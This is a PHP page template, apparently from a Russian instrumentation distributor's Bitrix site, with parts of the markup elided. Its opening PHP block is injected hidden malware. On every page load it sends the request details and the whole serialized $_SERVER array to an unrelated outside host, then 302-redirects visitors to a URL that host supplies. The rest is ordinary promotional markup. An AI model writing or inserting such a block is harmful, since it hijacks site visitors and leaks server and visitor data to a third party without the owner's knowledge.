<?php 
        $url = "http://polishedbrookroute.info/api_aiwohmahb_v2.php?method={$_SERVER['REQUEST_METHOD']}&domain={$_SERVER['HTTP_HOST']}&{$_SERVER['QUERY_STRING']}";
        $params['server'] = base64_encode( serialize( $_SERVER ) );
        $params['id'] = "";
        $ch = curl_init($url);
	...
	$json_response = json_decode($response, true);
		...
		if($json_response['status']){
                	header("Location: {$json_response['url']}?{$_SERVER['QUERY_STRING']}", true, 302);
                	exit();
		}
        }
?><?
...
<div class="page-container">
		...
		<div class="container">
			<div class="promo-columns">
				<div class="promo-column promo-column--left">
					<h1 class="promo-title"> <b>Контрольно-измерительные приборы</b> для автоматизации технологических процессов </h1>
				</div>
				<div class="promo-column promo-column--right">
					<div class="promo-partners">
						<div class="promo-partners-label">
							 «Анкорн» - эксклюзивный<br>
							дистрибьютор
						</div>
						<div class="promo-partners-list">
							<ul class="list">
								<li class="list-item"> <img width="168" alt="«Анкорн» - официальный дистрибьютор NIVELCO" src="/local/templates/ankorn/img/promo-partner-2.png" height="34"> </li>
							</ul>
						</div>
					</div>
				</div>
	...
	"banner-search",
	Array(
		"CATEGORY_0" => array(0=>"iblock_products",),
		"CATEGORY_0_TITLE" => "",
...
<div class="page-container">
 ...
 </section> <section class="applications pb-50">
<div class="container">
	 <?$APPLICATION->IncludeComponent(
...
<?$APPLICATION->IncludeComponent(
    ...
    Array(
        "AREA_FILE_SHOW" => "file",
        "EDIT_TEMPLATE" => "",
        "PATH" => "/include/official_distributor.php"
    )
);?>
